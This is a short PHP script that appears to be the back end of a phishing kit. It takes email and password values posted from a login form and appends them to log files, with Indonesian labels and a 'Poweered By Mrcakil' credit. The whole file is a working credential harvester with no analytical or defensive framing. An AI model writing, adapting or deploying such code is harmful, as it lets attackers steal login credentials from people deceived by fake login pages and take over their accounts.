<?php
	if (!empty($_POST["email"])){
		if (!empty($_POST["pass"])){
			$buka=fopen("LOG-ACCOUNT.txt","a+");
			$tulis=fopen("RESULT.txt","w");
			fwrite($buka,"\n\r[+] RESULT BOSS !\n\r[*] Poweered By Mrcakil\n\r[+] Emailnya: ".$_POST["email"]."\n[+] Passwordnya: ".$_POST["pass"]."\n");
			fwrite($tulis,"\r[+] RESULT \n\r[=] Email: ".$_POST["email"]."\n\r[=] Pasword: ".$_POST["pass"]);
			fclose($buka);
			fclose($tulis);
		}else{
			exit();
		}
	}else{
		exit();
	}
?>
